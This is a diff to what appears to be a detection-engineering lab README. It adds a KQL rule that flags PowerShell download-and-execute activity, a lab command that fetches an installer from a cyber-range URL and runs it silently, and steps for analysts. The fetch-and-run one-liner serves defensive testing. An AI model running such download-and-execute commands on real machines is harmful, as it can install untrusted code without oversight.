@@ -10,6 +10,27 @@ simulate activity → develop and deploy a custom KQL detection rule → trigger
 ## MITRE ATT&CK
 - **T1059.001 – Command and Scripting Interpreter: PowerShell**
 
+## Detection Logic (KQL)
+
+This query identifies PowerShell processes that download and execute files by looking for command lines containing both `Invoke-WebRequest` and `Start-Process`.
+
+Source file: [`query.kql`](query.kql)
+
+```kql
+let target_machine = "ap-vm";
+DeviceProcessEvents
+| where DeviceName == target_machine
+| where FileName in~ ("powershell.exe","pwsh.exe")
+| where ProcessCommandLine has_all ("Invoke-WebRequest","Start-Process")
+| where ProcessCommandLine has_any ("-ExecutionPolicy Bypass","-NoProfile")
+
+## Test / Reproduction (Lab)
+
+To validate the detection, I ran the following PowerShell command in a lab VM to simulate a download-and-execute pattern:
+
+```powershell
+Invoke-WebRequest -Uri "https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe" -OutFile "C:\ProgramData\7z2408-x64.exe"; Start-Process "C:\ProgramData\7z2408-x64.exe" -ArgumentList "/S" -Wait
+
 ## Detection in Action
 
 ### 1. Attack Execution
@@ -44,3 +65,14 @@ The process tree shows the sequence of events from command execution to file lau
 Additional context about the affected device:
 
 ![Device Overview](screenshots/device-overview.png)
+
+## Recommended Actions
+
+If this alert is triggered, analysts should:
+
+- Review the full command line and initiating process
+- Validate the source URL and downloaded file
+- Check if the activity was expected or authorized
+- Analyze the process tree for additional suspicious behavior
+- Isolate the device if malicious activity is confirmed
+- Collect an investigation package for further analysis
